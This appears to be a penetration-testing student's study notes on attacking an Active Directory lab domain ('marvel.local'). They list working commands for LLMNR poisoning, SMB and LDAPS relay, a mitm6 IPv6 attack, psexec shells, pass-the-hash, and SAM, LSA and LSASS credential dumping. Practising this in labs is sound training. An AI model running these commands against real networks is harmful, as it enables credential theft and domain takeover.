# Initial Attacks
---
[[Initial Attack Strategy]]

- **Run Responder and generate traffic** with nmap / nessus scans [[LLMNR Poisoning Lab]]
	- `sudo responder -I tun0 -dwv`
	- Make sure **all the Servers are on** (specially SMB and HTTP)
	- OneRuleToRuleThemAll (use if fails by default) to crack
	  
- **SMB Relay** (Look for ***Message/SMB signing disabled or not enforced/required*** in nmap) [[SMB Relay Attack Lab]]
	- **turn off SMB and HTTP switches** off in **Responder.conf**
	- `sudo responder -I tun0 -dwv`
	- `impacket-ntlmrelayx -tf targets.txt -smb2support`
- **==Gaining Access (shell) with captured Hash / Password==**
	- [[Gaining a Shell]]
	- **Psexec / WMIExec / SMBexec** (Use another if one fails)
		- `use exploit/windows/smb/psexec` On metasploit
			- Don't forget to **change architecture if required**
		- `impacket-psexec marvel.local/fcastle:'Password1'@10.0.0.25` using impacket => **Better as less noisy**
		  
- ==**IPv6 - MITM6 attack** (A good one)==
	- [[IPv6 Attack]]
	- **Run for 5-10 minutes ONLY to avoid outages**
	- First **run impacket to relay** : `impacket-ntlmrelayx -6 -t ldaps://<DC_IP> -wh fakewpad.marvel.local -l lootme`
	- Then for **domain dump**: `sudo /opt/tools/mitm6/mitm6_env/bin/python /opt/tools/mitm6/mitm6/mitm6.py -d marvel.local`
	- If **some ==administrator log ins, `mitm6.py` will create a new user in the domain for us**==
		- This user has **enterprise admins group and can do secretsdump or dcsync attack**

- ==**Printers or other servers with default/weak credentials**==
	- [[Printer Hacking]]
	- Something that **connects to LDAP, SMB, etc**
	  
- ==**Think out of the box**==
	- **Default credentials**
	- What else is available? - **Websites, Printers, Some other server**
# Post-Compromise Enumeration
---
[[Post-Compromise AD Enumeration]]
==**Look in the linked file in each tool on what to look for in dumped files**==

 - **LDAP Domain Dump**  [[Domain Enumeration ldapdomaindump]]
	 - **Make a new directory and cd into it** to avoid making mess of files
	 - `sudo ldapdomaindump ldaps://<DC_IP> -u 'MARVEL\fcastle' -p Password1 -o .`

- **==Bloodhound dump==** [[Domain Enumeration Bloodhound]]
	- Injestor: `sudo bloodhound-python -d MARVEL.local -u fcastle -p Password1 -ns 10.0.1.4 -c all`
	- `sudo neo4j console`
	- `sudo bloodhound`
	- Load collected data and **ENUMERATE**
	- **Double Click on Owned Users to find paths** 
	- [[Backup OPs, Account Ops, Exchange Wind Perms]]
	- ==If **domain admin is logged to non-domain controller**, we can do [[Token Impersonation Overview]]==
	- ==**Kerberoastable Users**==

- **Plumhound**
	- [[Plumhound]]
	- `sudo Plumhoundenv/bin/python PlumHound.py -x tasks/default.tasks -p neo4j1`
	- View report using: `firefox index.html`

- **PingCastle**
	- [[https://academy.tcm-sec.com/courses/1152300/lectures/48515112]]

# Post-Compromise Attacks
---
- **Pass Attacks** [[Pass Attacks Lab]]
	- For ==**enumerating where ELSE the compromised credentials have access to**==
	- `netexec smb 10.0.1.0/24 -u fcastle -d MARVEL.local -p Password1`
	- `netexec smb 10.0.1.0/24 -u pparker -H aad3b435b51404eeaad3b435b51404ee:e08e15bd995aa26400e3107deb56bb16 --local-auth --sam`=> 
		- **==Local Auth is required as we have ONLY  dumped hashes of a normal domain machine not from NTDS.dit and HASH does not take domain as argument==**
	- To **test hash reuse across workstations** using a **dumped local admin hash**:
		- `netexec smb 10.0.0.0/24 -u <local_user> -H <hash> --local-auth`
	- ==**Dump SAM** when there is **successful access**==:
		- `netexec smb 10.0.1.0/24 -u pparker -H aad3b435b51404eeaad3b435b51404ee:e08e15bd995aa26400e3107deb56bb16 --local-auth --sam`
	- **Dumping LSA**:
		- `netexec smb 10.0.1.0/24 -u pparker -H aad3b435b51404eeaad3b435b51404ee:e08e15bd995aa26400e3107deb56bb16 --local-auth --lsa`
	- **==LSASSY (logged in users sessions's password)==**:
		- `netexec smb 10.0.1.0/24 -u pparker -H aad3b435b51404eeaad3b435b51404ee:e08e15bd995aa26400e3107deb56bb16 --local-auth -M lsassy`